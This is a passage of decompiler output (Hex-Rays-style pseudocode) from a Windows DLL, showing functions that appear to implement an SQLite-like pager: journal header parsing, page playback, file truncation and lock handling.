  v11 = HIDWORD(v7);
  v10 = v7 + v8;
  v12 = SHIDWORD(v10) < (int)a4;
  *(_DWORD *)(a1 + 76) = HIDWORD(v7);
  if ( !v12 && (!v12 || (unsigned int)v10 > a3) )
    return 101;
  if ( a2 || v7 != *(_QWORD *)(a1 + 80) )
  {
    result = sub_100673FF(*(_DWORD *)(a1 + 60), (int)Buf1, 8, v7, SHIDWORD(v7));
    if ( result )
      return result;
    if ( memcmp(Buf1, &unk_100FEC08, 8u) )
      return 101;
  }
  result = sub_1006CC90(*(_DWORD *)(a1 + 60), v9 + 8, __CFADD__(v9, 8) + v11, a5);
  if ( !result )
  {
    result = sub_1006CC90(*(_DWORD *)(a1 + 60), v9 + 12, __CFADD__(v9, 12) + v11, (int *)(a1 + 44));
    if ( !result )
    {
      result = sub_1006CC90(*(_DWORD *)(a1 + 60), v9 + 16, __CFADD__(v9, 16) + v11, a6);
      if ( !result )
      {
        if ( *(_QWORD *)(a1 + 72) )
        {
LABEL_22:
          *(_QWORD *)(a1 + 72) += *(unsigned int *)(a1 + 112);
          return result;
        }
        result = sub_1006CC90(*(_DWORD *)(a1 + 60), v9 + 20, __CFADD__(v9, 20) + v11, (int *)&v16);
        if ( !result )
        {
          result = sub_1006CC90(*(_DWORD *)(a1 + 60), v9 + 24, (__PAIR64__(v11, v9) + 24) >> 32, (int *)&a4);
          if ( !result )
          {
            if ( a4 >= 0x200 )
            {
              v14 = v16;
              if ( v16 >= 0x20 && a4 <= 0x1000 && v16 <= 0x10000 && ((a4 - 1) & a4) == 0 && ((v16 - 1) & v16) == 0 )
              {
                a4 = (unsigned __int16)a4;
                result = sub_1006DEE6(a1, (unsigned __int16 *)&a4, -1);
                *(_DWORD *)(a1 + 112) = v14;
                goto LABEL_22;
              }
            }
            return 101;
          }
        }
      }
    }
  }
  return result;
}
// 1006D03C: variable 'v7' is possibly undefined

//----- (1006D1B6) --------------------------------------------------------
int __usercall sub_1006D1B6@<eax>(int a1@<esi>, char *a2)
{
  char v2; // al
  char i; // al
  int v4; // edx
  int v5; // edi
  int v6; // ebx
  int result; // eax
  __int64 v8; // kr08_8
  __int64 v9; // [esp+14h] [ebp-10h] BYREF
  int v10; // [esp+1Ch] [ebp-8h]
  int v11; // [esp+20h] [ebp-4h]

  v10 = 0;
  if ( !a2 )
    return 0;
  if ( *(_BYTE *)(a1 + 19) )
    return 0;
  v2 = *(_BYTE *)(a1 + 5);
  if ( v2 == 4 || v2 == 2 )
    return 0;
  v11 = 0;
  *(_BYTE *)(a1 + 19) = 1;
  for ( i = *a2; i; i = a2[v11] )
  {
    v10 += i;
    ++v11;
  }
  if ( *(_BYTE *)(a1 + 9) )
  {
    *(_DWORD *)(a1 + 72) = sub_1006CDFD((_DWORD *)a1);
    *(_DWORD *)(a1 + 76) = v4;
  }
  v5 = *(_DWORD *)(a1 + 76);
  v6 = *(_DWORD *)(a1 + 72);
  result = sub_1006CCC4(*(_DWORD *)(a1 + 60), v6, v5);
  if ( !result )
  {
    result = sub_10067419(*(_DWORD *)(a1 + 60), (int)a2, v11, v6 + 4, (__PAIR64__(v5, v6) + 4) >> 32);
    if ( !result )
    {
      v8 = __PAIR64__(v5, v6) + v11;
      result = sub_1006CCC4(*(_DWORD *)(a1 + 60), v6 + v11 + 4, (unsigned __int64)(v8 + 4) >> 32);
      if ( !result )
      {
        result = sub_1006CCC4(*(_DWORD *)(a1 + 60), v8 + 8, (unsigned __int64)(v8 + 8) >> 32);
        if ( !result )
        {
          result = sub_10067419(*(_DWORD *)(a1 + 60), (int)&unk_100FEC08, 8, v8 + 12, (unsigned __int64)(v8 + 12) >> 32);
          if ( !result )
          {
            *(_QWORD *)(a1 + 72) += v11 + 20;
            *(_BYTE *)(a1 + 16) = *(_BYTE *)(a1 + 8) == 0;
            result = (*(int (__cdecl **)(_DWORD, __int64 *))(**(_DWORD **)(a1 + 60) + 24))(*(_DWORD *)(a1 + 60), &v9);
            if ( !result && v9 > *(_QWORD *)(a1 + 72) )
              return sub_10067433(*(_DWORD *)(a1 + 60), *(_DWORD *)(a1 + 72), *(_DWORD *)(a1 + 76));
          }
        }
      }
    }
  }
  return result;
}
// 1006D218: variable 'v4' is possibly undefined

//----- (1006D326) --------------------------------------------------------
int __cdecl sub_1006D326(int a1, int a2)
{
  sub_100691BB(*(_DWORD *)(a1 + 168), a2, 0, &a1);
  return a1;
}

//----- (1006D34A) --------------------------------------------------------
void __usercall sub_1006D34A(int a1@<edi>)
{
  int i; // eax

  if ( !*(_DWORD *)(a1 + 36) )
  {
    for ( i = *(_DWORD *)(a1 + 172); i; i = *(_DWORD *)(i + 44) )
      *(_DWORD *)(i + 16) = 1;
    sub_100693BB(0, *(_DWORD *)(a1 + 168));
    *(_BYTE *)(a1 + 21) = 0;
  }
}

//----- (1006D378) --------------------------------------------------------
int __usercall sub_1006D378@<eax>(int a1@<edi>)
{
  int v1; // esi
  int i; // ebx
  int result; // eax

  v1 = 0;
  for ( i = 0; i < *(_DWORD *)(a1 + 92); v1 += 32 )
  {
    sub_10070E6B(*(_DWORD *)(v1 + *(_DWORD *)(a1 + 88) + 16));
    ++i;
  }
  if ( !*(_BYTE *)(a1 + 4) || **(_UNKNOWN ***)(a1 + 64) == &unk_1017F074 )
    sub_100673EE(*(_DWORD *)(a1 + 64));
  sub_10058E74(*(_DWORD *)(a1 + 88));
  result = 0;
  *(_DWORD *)(a1 + 88) = 0;
  *(_DWORD *)(a1 + 92) = 0;
  *(_DWORD *)(a1 + 48) = 0;
  return result;
}

//----- (1006D3C9) --------------------------------------------------------
int __usercall sub_1006D3C9@<eax>(unsigned int a1@<edi>, int a2@<esi>)
{
  int v2; // ebx
  int v3; // eax
  int v5; // [esp+4h] [ebp-8h]
  int v6; // [esp+8h] [ebp-4h]

  v2 = 0;
  v5 = 0;
  if ( *(int *)(a2 + 92) > 0 )
  {
    v6 = 0;
    do
    {
      v3 = v6 + *(_DWORD *)(a2 + 88);
      if ( a1 <= *(_DWORD *)(v3 + 20) )
        v5 |= sub_10070C77(*(_DWORD **)(v3 + 16), a1);
      v6 += 32;
      ++v2;
    }
    while ( v2 < *(_DWORD *)(a2 + 92) );
  }
  return v5;
}

//----- (1006D405) --------------------------------------------------------
void __usercall sub_1006D405(int a1@<eax>)
{
  int v2; // eax
  int v3; // eax

  if ( !*(_BYTE *)(a1 + 4) )
  {
    sub_100673EE(*(_DWORD *)(a1 + 60));
    sub_10070E6B(*(_DWORD *)(a1 + 52));
    *(_DWORD *)(a1 + 52) = 0;
    sub_1006D378(a1);
    v2 = *(_DWORD *)(a1 + 56);
    *(_BYTE *)(a1 + 21) = 0;
    if ( *(_DWORD *)v2 )
    {
      v3 = (*(int (__cdecl **)(int, _DWORD))(*(_DWORD *)v2 + 32))(v2, 0);
      if ( v3 )
        *(_DWORD *)(a1 + 36) = v3;
    }
    else
    {
      v3 = 0;
    }
    if ( *(_DWORD *)(a1 + 36) )
    {
      if ( !v3 )
        *(_DWORD *)(a1 + 36) = 0;
      sub_1006D34A(a1);
    }
    *(_BYTE *)(a1 + 18) = 0;
    *(_BYTE *)(a1 + 14) = 0;
    *(_BYTE *)(a1 + 15) = 0;
  }
}

//----- (1006D466) --------------------------------------------------------
int __usercall sub_1006D466@<eax>(int result@<eax>, int a2)
{
  if ( (unsigned __int8)result == 13 || (unsigned __int8)result == 10 )
    *(_DWORD *)(a2 + 36) = result;
  return result;
}

//----- (1006D483) --------------------------------------------------------
void __usercall sub_1006D483(int a1@<esi>)
{
  if ( !*(_DWORD *)(a1 + 36) && *(_BYTE *)(a1 + 14) >= 2u )
  {
    sub_10069106();
    sub_1006F3D2(a1);
    sub_10069112();
  }
  sub_1006D405(a1);
}

//----- (1006D4A7) --------------------------------------------------------
int __usercall sub_1006D4A7@<eax>(_DWORD *a1@<eax>, int a2)
{
  int result; // eax
  void **v4; // esi
  char v5; // al
  _DWORD **i; // esi
  int v7; // eax
  int v8; // eax
  int v9; // esi
  int v10; // [esp+Ch] [ebp-8h]
  int v11; // [esp+10h] [ebp-4h]

  v11 = 0;
  v10 = 0;
  if ( *((_BYTE *)a1 + 14) < 2u )
    return 0;
  sub_1006D378((int)a1);
  v4 = (void **)a1[15];
  if ( *v4 )
  {
    if ( *v4 == &unk_1017F074 )
    {
      sub_100673EE((int)v4);
    }
    else
    {
      v5 = *((_BYTE *)a1 + 5);
      if ( v5 == 3 )
      {
        if ( *((_QWORD *)a1 + 9) )
          v11 = sub_10067433((int)v4, 0, 0);
        else
          v11 = 0;
      }
      else
      {
        if ( !*((_BYTE *)a1 + 4) && v5 != 1 )
        {
          sub_100673EE((int)v4);
          if ( !*((_BYTE *)a1 + 11) )
            v11 = (*(int (__cdecl **)(_DWORD, _DWORD, _DWORD))(*a1 + 28))(*a1, a1[34], 0);
          goto LABEL_16;
        }
        v11 = sub_1006CE44((int)a1, a2);
        sub_1006D466(v11, (int)a1);
      }
      *((_BYTE *)a1 + 17) = 0;
      a1[19] = 0;
      a1[18] = 0;
    }
LABEL_16:
    for ( i = (_DWORD **)a1[42]; *i; sub_10069369(*i) )
      ;
    sub_10070E6B(a1[13]);
    a1[13] = 0;
    a1[10] = 0;
  }
  if ( *((_BYTE *)a1 + 4) )
  {
    if ( *((_BYTE *)a1 + 14) == 5 )
      *((_BYTE *)a1 + 14) = 4;
  }
  else
  {
    v7 = a1[14];
    if ( *(_DWORD *)v7 )
      v10 = (*(int (__cdecl **)(int, int))(*(_DWORD *)v7 + 32))(v7, 1);
    else
      v10 = 0;
    *((_BYTE *)a1 + 14) = 1;
    *((_BYTE *)a1 + 18) = 0;
  }
  v8 = a1[6];
  v9 = a1[42];
  *((_BYTE *)a1 + 19) = 0;
  *((_BYTE *)a1 + 16) = 0;
  *((_BYTE *)a1 + 15) = 0;
  a1[7] = 0;
  sub_100693BB(v8, v9);
  if ( !*((_BYTE *)a1 + 13) )
    *((_BYTE *)a1 + 21) = 0;
  result = v11;
  if ( !v11 )
    return v10;
  return result;
}

//----- (1006D5D4) --------------------------------------------------------
int __cdecl sub_1006D5D4(int a1)
{
  int v1; // ecx
  int result; // eax
  int i; // ecx
  int v4; // esi

  result = *(_DWORD *)(v1 + 44);
  for ( i = *(_DWORD *)(v1 + 124) - 200; i > 0; result += v4 )
  {
    v4 = *(unsigned __int8 *)(i + a1);
    i -= 200;
  }
  return result;
}
// 1006D5D7: variable 'v1' is possibly undefined

//----- (1006D5FB) --------------------------------------------------------
int __usercall sub_1006D5FB@<eax>(int a1@<eax>, int *a2@<esi>, int a3, int a4, int a5, unsigned int *a6)
{
  void *v7; // edi
  char **v8; // eax
  int result; // eax
  char *v10; // edi
  char *v11; // eax
  int v12; // eax
  bool v13; // cf
  char **v14; // ecx
  __int64 v15; // rax
  int v16; // eax
  bool v17; // cc
  int v18; // eax
  char **v19; // ecx
  size_t v20; // [esp-4h] [ebp-1Ch]
  char *v21; // [esp+8h] [ebp-10h] BYREF
  void *Src; // [esp+Ch] [ebp-Ch]
  int v23; // [esp+10h] [ebp-8h]
  char **v24; // [esp+14h] [ebp-4h] BYREF

  v7 = *(void **)(a1 + 152);
  Src = v7;
  if ( a3 )
    v8 = *(char ***)(a1 + 60);
  else
    v8 = *(char ***)(a1 + 64);
  v24 = v8;
  result = sub_1006CC90((int)v8, *a2, a2[1], (int *)&v21);
  if ( !result )
  {
    result = sub_100673FF(
               (int)v24,
               (int)v7,
               *(_DWORD *)(a1 + 124),
               *a2 + 4,
               (unsigned __int64)(*(_QWORD *)a2 + 4i64) >> 32);
    v23 = result;
    if ( !result )
    {
      v10 = v21;
      *(_QWORD *)a2 += *(_DWORD *)(a1 + 124) + 4 * a3 + 4;
      if ( !v10 || v10 == (char *)(0x40000000 / *(_DWORD *)(a1 + 124) + 1) )
        return 101;
      if ( (unsigned int)v10 > *(_DWORD *)(a1 + 24) || sub_10070BFA((unsigned int)v10, a6) )
        return 0;
      if ( !a3 )
        goto LABEL_14;
      result = sub_1006CC90((int)v24, *a2 - 4, (unsigned __int64)(*(_QWORD *)a2 - 4i64) >> 32, (int *)&v21);
      v23 = result;
      if ( result )
        return result;
      if ( a5 || (v11 = (char *)sub_1006D5D4((int)Src), v11 == v21) )
      {
LABEL_14:
        if ( a6 )
        {
          v23 = sub_10070C77(a6, (int)v10);
          if ( v23 )
            return v23;
        }
        v12 = sub_1006D326(a1, (int)v10);
        v13 = *(_BYTE *)(a1 + 14) < 4u;
        v14 = (char **)v12;
        v24 = (char **)v12;
        if ( !v13 && (!v12 || (*(_BYTE *)(v12 + 20) & 4) == 0) && **(_DWORD **)(a1 + 56) && !a4 )
        {
          v15 = (unsigned int)(v10 - 1) * (__int64)*(int *)(a1 + 124);
          v16 = sub_10067419(*(_DWORD *)(a1 + 56), (int)Src, *(_DWORD *)(a1 + 124), v15, SHIDWORD(v15));
          v17 = (unsigned int)v10 <= *(_DWORD *)(a1 + 32);
          v23 = v16;
          if ( !v17 )
            *(_DWORD *)(a1 + 32) = v10;
          v18 = *(_DWORD *)(a1 + 172);
          if ( v18 )
            sub_1008229D(v18, (unsigned int)v10, (int)Src);
LABEL_30:
          v14 = v24;
          if ( !v24 )
            return v23;
LABEL_31:
          v20 = *(_DWORD *)(a1 + 124);
          v21 = *v14;
          memcpy(v21, Src, v20);
          (*(void (__cdecl **)(char **))(a1 + 148))(v24);
          if ( a3 && (!a5 || *(_QWORD *)a2 <= *(_QWORD *)(a1 + 80)) )
            sub_10069369(v24);
          if ( v10 == (char *)1 )
            memcpy((void *)(a1 + 96), v21 + 24, 0x10u);
          sub_100692F6((int)v24);
          return v23;
        }
        if ( a3 )
          goto LABEL_30;
        if ( v12 )
          goto LABEL_31;
        result = sub_1006EB74(a1, (unsigned int)v10, &v24, 1);
        v23 = result;
        if ( !result )
        {
          v19 = v24;
          *((_WORD *)v24 + 10) &= ~8u;
          sub_1006934E((int)v19);
          goto LABEL_30;
        }
      }
      else
      {
        return 101;
      }
    }
  }
  return result;
}

//----- (1006D831) --------------------------------------------------------
int __usercall sub_1006D831@<eax>(int *a1@<eax>, char *Str2)
{
  int v2; // ebx
  void *v3; // esi
  int v4; // eax
  int v5; // edi
  int v6; // esi
  int v7; // eax
  _BYTE *v8; // eax
  int v9; // esi
  _BYTE *v10; // eax
  int v11; // ecx
  unsigned int v13; // [esp-4h] [ebp-38h]
  __int64 v14; // [esp+Ch] [ebp-28h] BYREF
  int v15; // [esp+18h] [ebp-1Ch]
  int v16; // [esp+1Ch] [ebp-18h] BYREF
  int v17; // [esp+20h] [ebp-14h]
  int v18; // [esp+24h] [ebp-10h]
  char *Str1; // [esp+28h] [ebp-Ch]
  _BYTE *v20; // [esp+2Ch] [ebp-8h]
  int v21; // [esp+30h] [ebp-4h]

  v21 = 0;
  v2 = *a1;
  v3 = sub_10059025(2 * *(_DWORD *)(*a1 + 4));
  v4 = (int)v3 + *(_DWORD *)(v2 + 4);
  v18 = (int)v3;
  v17 = v4;
  if ( v3 )
  {
    v5 = sub_10067457(16385, v2, (int)Str2, (int)v3, 0);
    if ( v5 || (v5 = (*(int (__cdecl **)(void *, __int64 *))(*(_DWORD *)v3 + 24))(v3, &v14)) != 0 )
    {
LABEL_21:
      sub_100673EE(v18);
      goto LABEL_22;
    }
    if ( v14 > 0 )
    {
      v15 = *(_DWORD *)(v2 + 8) + 1;
      v6 = v15;
      v7 = sub_10058C4C(v14 + v15 + 1);
      v21 = v7;
      if ( !v7 )
      {
        v5 = 7;
        goto LABEL_19;
      }
      Str1 = (char *)(v14 + v7 + 1);
      v5 = sub_100673FF(v18, v7, v14, 0, 0);
      if ( v5 )
      {
LABEL_19:
        if ( v21 )
          sub_10058E74(v21);
        goto LABEL_21;
      }
      v8 = (_BYTE *)v21;
      *(_BYTE *)(v14 + v21) = 0;
      v20 = v8;
      if ( v14 > 0 )
      {
        do
        {
          v5 = (*(int (__cdecl **)(int, _BYTE *, _DWORD, int *))(v2 + 32))(v2, v20, 0, &v16);
          if ( v5 )
            goto LABEL_19;
          if ( v16 )
          {
            v5 = sub_10067457(2049, v2, (int)v20, v17, 0);
            if ( v5 )
              goto LABEL_19;
            v13 = v6;
            v9 = v17;
            v5 = sub_1006CCE6(v17, Str1, v13);
            sub_100673EE(v9);
            if ( v5 || *Str1 && !strcmp(Str1, Str2) )
              goto LABEL_19;
            v6 = v15;
          }
          v10 = sub_10059297(v20);
          v20 = &v10[v11 + 1];
        }
        while ( (int)&v20[-v21] < v14 );
      }
    }
    v5 = (*(int (__cdecl **)(int, char *, _DWORD))(v2 + 28))(v2, Str2, 0);
    goto LABEL_19;
  }
  v5 = 7;
LABEL_22:
  sub_10058E74(v18);
  return v5;
}
// 1006D98F: variable 'v11' is possibly undefined
// 1006D831: using guessed type __int64 var_28;

//----- (1006D9E3) --------------------------------------------------------
int __usercall sub_1006D9E3@<eax>(int a1@<esi>, unsigned int a2)
{
  int v2; // edi
  int v3; // eax
  signed __int64 v4; // rax
  int v5; // eax
  __int64 v7; // [esp+4h] [ebp-8h] BYREF

  v2 = 0;
  if ( *(_BYTE *)(a1 + 14) >= 4u )
  {
    v3 = *(_DWORD *)(a1 + 56);
    if ( *(_DWORD *)v3 )
    {
      v2 = (*(int (__cdecl **)(int, __int64 *))(*(_DWORD *)v3 + 24))(v3, &v7);
      v4 = *(int *)(a1 + 124) * (unsigned __int64)a2;
      if ( !v2 && v7 != v4 )
      {
        if ( v7 <= v4 )
          v5 = sub_10067419(*(_DWORD *)(a1 + 56), (int)&unk_10186439, 1, v4 - 1, (unsigned __int64)(v4 - 1) >> 32);
        else
          v5 = sub_10067433(*(_DWORD *)(a1 + 56), v4, SHIDWORD(v4));
        v2 = v5;
        if ( !v5 )
          *(_DWORD *)(a1 + 32) = a2;
      }
    }
  }
  return v2;
}

//----- (1006DA69) --------------------------------------------------------
_DWORD *__usercall sub_1006DA69@<eax>(int a1@<esi>)
{
  int (__cdecl *v1)(_DWORD); // ecx
  int v2; // eax
  _DWORD *result; // eax

  if ( !*(_BYTE *)(a1 + 11) )
  {
    v1 = *(int (__cdecl **)(_DWORD))(**(_DWORD **)(a1 + 56) + 44);
    if ( v1 )
      v2 = v1(*(_DWORD *)(a1 + 56));
    else
      v2 = 512;
    *(_DWORD *)(a1 + 112) = v2;
  }
  result = (_DWORD *)(a1 + 112);
  if ( *(_DWORD *)(a1 + 112) < 0x20u )
    *result = 512;
  if ( *result > 0x10000u )
    *result = 0x10000;
  return result;
}

//----- (1006DAA3) --------------------------------------------------------
int __usercall sub_1006DAA3@<eax>(unsigned int *a1@<ebx>, _BYTE *a2)
{
  unsigned int v2; // eax
  unsigned int v3; // esi
  int v4; // edi
  unsigned int *v5; // edi
  int v6; // eax
  bool i; // zf
  unsigned int v8; // esi
  unsigned int v9; // edi
  int v10; // eax
  char *v11; // esi
  __int64 v13; // [esp-10h] [ebp-44h]
  unsigned int v14; // [esp-4h] [ebp-38h]
  __int64 v15; // [esp+Ch] [ebp-28h] BYREF
  _BYTE *v16; // [esp+18h] [ebp-1Ch]
  int v17; // [esp+1Ch] [ebp-18h] BYREF
  int v18; // [esp+20h] [ebp-14h]
  int v19; // [esp+24h] [ebp-10h]
  unsigned int v20; // [esp+28h] [ebp-Ch] BYREF
  unsigned int v21; // [esp+2Ch] [ebp-8h] BYREF
  int v22; // [esp+30h] [ebp-4h]

  v2 = a1[15];
  v20 = 0;
  v3 = *a1;
  v17 = 1;
  v22 = (*(int (__cdecl **)(unsigned int, __int64 *))(*(_DWORD *)v2 + 24))(v2, &v15);
  if ( !v22 )
  {
    if ( v15 )
    {
      v4 = a1[15];
      v14 = *(_DWORD *)(*a1 + 8) + 1;
      v16 = (_BYTE *)a1[38];
      v22 = sub_1006CCE6(v4, v16, v14);
      if ( !v22
        && (!*v16 || (v22 = (*(int (__cdecl **)(unsigned int, _BYTE *, _DWORD, int *))(v3 + 32))(v3, v16, 0, &v17)) == 0) )
      {
        if ( v17 )
        {
          v13 = v15;
          v5 = a1 + 18;
          v16 = a2;
          a1[18] = 0;
          a1[19] = 0;
          v18 = 0;
          v6 = sub_1006D020((int)a1, (int)a2, v13, HIDWORD(v13), (int *)&v21, (int *)&v20);
          for ( i = v6 == 0; ; i = v6 == 0 )
          {
            v22 = v6;
            if ( !i )
              break;
            if ( v21 == -1 )
              v21 = (v15 - a1[28]) / (int)(a1[31] + 8);
            if ( !v21 && !a2 )
            {
              v8 = *v5;
              v9 = v5[1];
              if ( *((_QWORD *)a1 + 10) + a1[28] == __PAIR64__(v9, v8) )
              {
                v21 = (__int64)(v15 - __PAIR64__(v9, v8)) / (int)(a1[31] + 8);
                v18 = 1;
              }
            }
            v5 = a1 + 18;
            if ( a1[18] == a1[28] && !a1[19] )
            {
              v22 = sub_1006D9E3((int)a1, v20);
              if ( v22 )
                goto LABEL_30;
              a1[6] = v20;
            }
            v19 = 0;
            if ( v21 )
            {
              while ( 1 )
              {
                if ( v16 )
                {
                  sub_1006D34A((int)a1);
                  v16 = 0;
                }
                v5 = a1 + 18;
                v10 = sub_1006D5FB((int)a1, (int *)a1 + 18, 1, v18, 0, 0);
                v22 = v10;
                if ( v10 )
                  break;
                if ( ++v19 >= v21 )
                  goto LABEL_26;
              }
              if ( v10 != 101 )
                goto LABEL_30;
              *v5 = v15;
              a1[19] = HIDWORD(v15);
            }
LABEL_26:
            v18 = 0;
            v6 = sub_1006D020((int)a1, (int)a2, v15, HIDWORD(v15), (int *)&v21, (int *)&v20);
          }
          if ( v6 == 101 )
            v22 = 0;
        }
      }
    }
  }
LABEL_30:
  i = v22 == 0;
  *((_BYTE *)a1 + 18) = *((_BYTE *)a1 + 11);
  if ( i )
  {
    v11 = (char *)a1[38];
    v22 = sub_1006CCE6(a1[15], v11, *(_DWORD *)(*a1 + 8) + 1);
    if ( !v22 )
    {
      v22 = sub_1006D4A7(a1, *v11 != 0);
      if ( !v22 && *v11 && v17 )
        v22 = sub_1006D831((int *)a1, v11);
    }
  }
  sub_1006DA69((int)a1);
  return v22;
}

//----- (1006DCF2) --------------------------------------------------------
int __cdecl sub_1006DCF2(_DWORD *a1, _DWORD *a2)
{
  int v2; // ebx
  _DWORD *v3; // esi
  int result; // eax
  int v5; // eax
  int *v6; // edi
  int v7; // ecx
  __int64 v8; // rax
  int v9; // eax
  unsigned int v10; // esi
  __int64 v11; // [esp+10h] [ebp-20h]
  __int64 v12; // [esp+18h] [ebp-18h] BYREF
  unsigned int v13; // [esp+20h] [ebp-10h]
  unsigned int v14; // [esp+24h] [ebp-Ch] BYREF
  unsigned int *v15; // [esp+28h] [ebp-8h]
  int v16; // [esp+2Ch] [ebp-4h]
  unsigned int i; // [esp+3Ch] [ebp+Ch]

  v16 = 0;
  v15 = 0;
  v2 = (int)a1;
  v3 = a2;
  if ( a2 )
  {
    v15 = sub_10070BE1(a2[5]);
    if ( !v15 )
      return 7;
    v5 = a2[5];
  }
  else
  {
    v5 = a1[7];
  }
  v6 = a1 + 18;
  a1[6] = v5;
  v11 = *((_QWORD *)a1 + 9);
  if ( a2 )
  {
    v7 = a2[3];
    if ( *((_QWORD *)a2 + 1) )
    {
      LODWORD(v12) = a2[2];
      HIDWORD(v12) = v7;
    }
    else
    {
      v12 = *((_QWORD *)a1 + 9);
    }
    *v6 = *a2;
    a1[19] = a2[1];
    do
    {
      if ( *((_QWORD *)a1 + 9) >= v12 )
        break;
      v3 = a2;
      v16 = sub_1006D5FB((int)a1, a1 + 18, 1, 0, 1, v15);
    }
    while ( !v16 );
  }
  else
  {
    *v6 = 0;
    a1[19] = 0;
  }
  while ( !v16 && *(_QWORD *)v6 < v11 )
  {
    v14 = 0;
    v16 = sub_1006D020(v2, 0, v11, HIDWORD(v11), (int *)&v14, (int *)&v12 + 1);
    if ( !v14 && *(_QWORD *)(v2 + 80) + *(unsigned int *)(v2 + 112) == *(_QWORD *)v6 )
    {
      v8 = (v11 - *(_QWORD *)v6) / (*(_DWORD *)(v2 + 124) + 8);
      v2 = (int)a1;
      v3 = a2;
      v14 = v8;
    }
    v13 = 0;
    if ( v16 )
      break;
    do
    {
      if ( v13 >= v14 )
        break;
      if ( *(_QWORD *)v6 >= v11 )
        break;
      v9 = sub_1006D5FB(v2, v6, 1, 0, 1, v15);
      v3 = a2;
      ++v13;
      v16 = v9;
    }
    while ( !v9 );
  }
  if ( v3 )
  {
    v10 = v3[6];
    v12 = v10 * (*(_DWORD *)(v2 + 124) + 4);
    for ( i = v10; !v16; v16 = sub_1006D5FB(v2, (int *)&v12, 0, 0, 1, v15) )
    {
      if ( i >= *(_DWORD *)(v2 + 48) )
        break;
      ++i;
    }
  }
  sub_10070E6B((int)v15);
  result = v16;
  if ( !v16 )
  {
    *v6 = v11;
    a1[19] = HIDWORD(v11);
  }
  return result;
}

//----- (1006DEE6) --------------------------------------------------------
int __usercall sub_1006DEE6@<eax>(int a1@<ebx>, unsigned __int16 *a2, int a3)
{
  unsigned __int16 v3; // ax
  int v4; // esi
  int v5; // esi
  int v7; // [esp+0h] [ebp-Ch]
  int v8; // [esp+4h] [ebp-8h]
  int v9; // [esp+8h] [ebp-4h]

  v9 = *(_DWORD *)(a1 + 36);
  if ( !v9 )
  {
    v3 = *a2;
    if ( (!*(_BYTE *)(a1 + 13) || !*(_DWORD *)(a1 + 24)) && !*(_DWORD *)(*(_DWORD *)(a1 + 168) + 12) )
    {
      if ( v3 )
      {
        v4 = v3;
        v7 = v3;
        if ( v3 != *(_DWORD *)(a1 + 124) )
        {
          v8 = sub_10066DBF(v3);
          if ( v8 )
          {
            sub_1006D34A(a1);
            *(_DWORD *)(a1 + 124) = v4;
            sub_10066DE3(*(_DWORD **)(a1 + 152));
            v5 = *(_DWORD *)(a1 + 168);
            *(_DWORD *)(a1 + 152) = v8;
            if ( *(_DWORD *)(v5 + 40) )
            {
              dword_101821CC(*(_DWORD *)(v5 + 40));
              *(_DWORD *)(v5 + 40) = 0;
            }
            *(_DWORD *)(v5 + 20) = v7;
          }
          else
          {
            v9 = 7;
          }
        }
      }
    }
    *a2 = *(_WORD *)(a1 + 124);
    if ( a3 < 0 )
      LOWORD(a3) = *(_WORD *)(a1 + 118);
    *(_WORD *)(a1 + 118) = a3;
  }
  return v9;
}
// 101821CC: using guessed type int (__cdecl *dword_101821CC)(_DWORD);

//----- (1006DFA2) --------------------------------------------------------
int __cdecl sub_1006DFA2(int a1, void *a2)
{
  int v2; // edi
  _DWORD *v3; // eax

  v2 = 0;
  memset(a2, 0, 0x64u);
  v3 = *(_DWORD **)(a1 + 56);
  if ( *v3 )
  {
    v2 = sub_100673FF((int)v3, (int)a2, 100, 0, 0);
    if ( v2 == 522 )
      return 0;
  }
  return v2;
}

//----- (1006DFE2) --------------------------------------------------------
int __usercall sub_1006DFE2@<eax>(_DWORD *a1@<edi>, int a2@<esi>)
{
  int result; // eax
  __int64 v3; // rax
  int v4; // eax
  int v5; // eax
  __int64 v6; // [esp+4h] [ebp-8h] BYREF

  result = *(_DWORD *)(a2 + 36);
  if ( !result )
  {
    if ( *(_BYTE *)(a2 + 21) )
    {
      LODWORD(v3) = *(_DWORD *)(a2 + 24);
    }
    else
    {
      v4 = *(_DWORD *)(a2 + 56);
      v6 = 0i64;
      if ( !*(_DWORD *)v4 )
        goto LABEL_10;
      v5 = (*(int (__cdecl **)(int, __int64 *))(*(_DWORD *)v4 + 24))(v4, &v6);
      if ( v5 )
        return sub_1006D466(v5, a2);
      if ( v6 > 0 && v6 < *(int *)(a2 + 124) )
        LODWORD(v3) = 1;
      else
LABEL_10:
        v3 = v6 / *(int *)(a2 + 124);
      if ( *(_BYTE *)(a2 + 14) )
      {
        *(_DWORD *)(a2 + 24) = v3;
        *(_DWORD *)(a2 + 32) = v3;
        *(_BYTE *)(a2 + 21) = 1;
      }
    }
    if ( (unsigned int)v3 > *(_DWORD *)(a2 + 128) )
      *(_DWORD *)(a2 + 128) = v3;
    if ( a1 )
      *a1 = v3;
    return 0;
  }
  return result;
}

//----- (1006E07D) --------------------------------------------------------
int __usercall sub_1006E07D@<eax>(int a1@<ebx>, int a2@<esi>)
{
  int v2; // edi

  if ( *(unsigned __int8 *)(a2 + 14) >= a1 )
    return 0;
  do
    v2 = (*(int (__cdecl **)(_DWORD, int))(**(_DWORD **)(a2 + 56) + 28))(*(_DWORD *)(a2 + 56), a1);
  while ( v2 == 5 && (*(int (__cdecl **)(_DWORD))(a2 + 140))(*(_DWORD *)(a2 + 144)) );
  if ( !v2 )
    *(_BYTE *)(a2 + 14) = a1;
  return v2;
}

//----- (1006E0B9) --------------------------------------------------------
int __usercall sub_1006E0B9@<eax>(int a1@<eax>)
{
  sub_10069106();
  *(_DWORD *)(a1 + 36) = 0;
  *(_BYTE *)(a1 + 4) = 0;
  sub_1006D34A(a1);
  if ( *(_BYTE *)(a1 + 13) )
  {
    sub_1006D405(a1);
  }
  else
  {
    *(_DWORD *)(a1 + 80) = -1;
    *(_DWORD *)(a1 + 84) = -1;
    sub_1006D483(a1);
  }
  sub_10069112();
  sub_100673EE(*(_DWORD *)(a1 + 56));
  sub_10066DE3(*(_DWORD **)(a1 + 152));
  if ( *(_DWORD *)(*(_DWORD *)(a1 + 168) + 40) )
    dword_101821CC(*(_DWORD *)(*(_DWORD *)(a1 + 168) + 40));
  sub_10058E74(a1);
  return 0;
}
// 101821CC: using guessed type int (__cdecl *dword_101821CC)(_DWORD);

//----- (1006E128) --------------------------------------------------------
int __usercall sub_1006E128@<eax>(int a1@<eax>)
{
  int v2; // ebx
  int v3; // eax
  int v4; // edx
  int result; // eax
  int *v6; // esi
  int i; // eax
  char v8[8]; // [esp+Ch] [ebp-24h] BYREF
  char v9[8]; // [esp+14h] [ebp-1Ch] BYREF
